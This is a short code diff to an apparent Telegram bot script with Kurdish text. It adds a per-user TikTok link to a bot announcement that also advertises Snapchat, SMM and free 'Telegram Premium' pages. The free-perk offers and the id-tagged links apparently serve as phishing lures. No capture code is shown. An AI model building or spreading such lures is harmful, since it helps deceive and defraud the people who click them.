@@ -10,6 +10,7 @@ WEB_APP_URL = "https://miladpeshmerga-web.github.io/my-responsive-site-/"
 SNAPCHAT_WEB_APP_URL = "https://miladpeshmerga-web.github.io/my-responsive-site-/snapchat.html"
 SMM_WEB_APP_URL = "https://miladpeshmerga-web.github.io/my-responsive-site-/smm.html"
 PREMIUM_WEB_APP_URL = "https://miladpeshmerga-web.github.io/my-responsive-site-/telegram-premium.html"
+TIKTOK_WEB_APP_URL = "https://miladpeshmerga-web.github.io/my-responsive-site-/tiktok.html"
 
 def load_users():
     """خوێندنەوەی لیستی بەکارهێنەران لە فایلی users.json بە شێوەی ئۆبێکت/دیکشنری"""
@@ -89,6 +90,7 @@ def main():
             personal_link_snap = f"{SNAPCHAT_WEB_APP_URL}?id={user_id}"
             personal_link_smm = f"{SMM_WEB_APP_URL}?id={user_id}"
             personal_link_premium = f"{PREMIUM_WEB_APP_URL}?id={user_id}"
+            personal_link_tiktok = f"{TIKTOK_WEB_APP_URL}?id={user_id}"
 
             announcement_text = (
                 f"👋 سڵاو! ئەم سیستمە پێشکەوتووە لەلایەن **میلاد مزوری**ـەوە دروست کراوە.\n\n"
@@ -100,6 +102,8 @@ def main():
                 f"{personal_link_smm}\n\n"
                 f"🔗 ئەمە لینکی Telegram Premium 3 Days:\n"
                 f"{personal_link_premium}\n\n"
+                f"🔗 ئەمە لینکی TikTok Verified Badge:\n"
+                f"{personal_link_tiktok}\n\n"
                 f"💬 بۆ پەیوەندیکردن بە دروستکەری بۆتەکە (میلاد غازی):\n"
                 f"https://t.me/MiladGhaziHussein"
             )
